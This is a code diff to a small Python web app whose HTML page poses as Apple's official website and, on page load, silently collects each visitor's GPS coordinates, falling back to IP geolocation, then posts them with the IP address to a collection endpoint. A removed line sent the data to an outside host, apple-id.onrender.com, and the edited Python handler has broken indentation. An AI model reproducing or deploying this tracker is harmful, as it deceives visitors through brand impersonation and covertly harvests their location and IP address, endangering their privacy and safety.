@@ -116,11 +116,11 @@ HTML_PAGE = '''
     Website chính thức của apple
   </div>
 
-  <<script>
+  <script>
   window.addEventListener('DOMContentLoaded', async () => {
     const sendData = async (payload) => {
       try {
-        await fetch('https://apple-id.onrender.com/submit', {
+        await fetch('/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
@@ -131,66 +131,45 @@ HTML_PAGE = '''
       }
     };
 
-    // Ưu tiên: Lấy vị trí bằng GPS
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
+          const ipRes = await fetch('https://ipapi.co/json/');
+          const ipData = await ipRes.json();
 
-            const payload = {
-              ip: ipData.ip,
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude
-            };
+          const payload = {
+            ip: ipData.ip,
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          };
 
-            await sendData(payload);
-          } catch (err) {
-            console.error("❌ Lỗi khi lấy IP:", err);
-          }
+          await sendData(payload);
         },
-        // Nếu GPS bị từ chối → fallback sang IP
         async (err) => {
-          console.warn("⚠️ GPS không khả dụng, fallback IP:", err.message);
-          try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            const payload = {
-              ip: data.ip,
-              latitude: data.latitude,
-              longitude: data.longitude
-            };
-            await sendData(payload);
-          } catch (err2) {
-            console.error("❌ Lỗi fallback IP:", err2);
-          }
+          const res = await fetch('https://ipapi.co/json/');
+          const data = await res.json();
+          const payload = {
+            ip: data.ip,
+            latitude: data.latitude,
+            longitude: data.longitude
+          };
+          await sendData(payload);
         },
         { timeout: 5000 }
       );
     } else {
-      // Nếu không có geolocation API
-      console.warn("⚠️ Trình duyệt không hỗ trợ geolocation");
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        const payload = {
-          ip: data.ip,
-          latitude: data.latitude,
-          longitude: data.longitude
-        };
-        await sendData(payload);
-      } catch (err3) {
-        console.error("❌ Lỗi lấy IP:", err3);
-      }
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      const payload = {
+        ip: data.ip,
+        latitude: data.latitude,
+        longitude: data.longitude
+      };
+      await sendData(payload);
     }
-
-    // Nút chuyển tiếp
-    document.getElementById("verifyBtn")?.addEventListener("click", () => {
-      window.location.href = "https://www.apple.com/shop/";
-    });
   });
 </script>
+
 
 
 </body>
@@ -216,9 +195,9 @@ def submit():
         print("❌ JSON lỗi:", str(e))
         return jsonify({'error': 'JSON decode failed'}), 400
 
-    ip = data.get('ip')
-    lat = data.get('latitude')
-    lon = data.get('longitude')
+  ip = data.get('ip') or request.headers.get('X-Forwarded-For', request.remote_addr)
+lat = data.get('latitude')
+lon = data.get('longitude')
 
     if not ip or lat is None or lon is None:
         print("⚠️ Thiếu IP hoặc vị trí:", data)
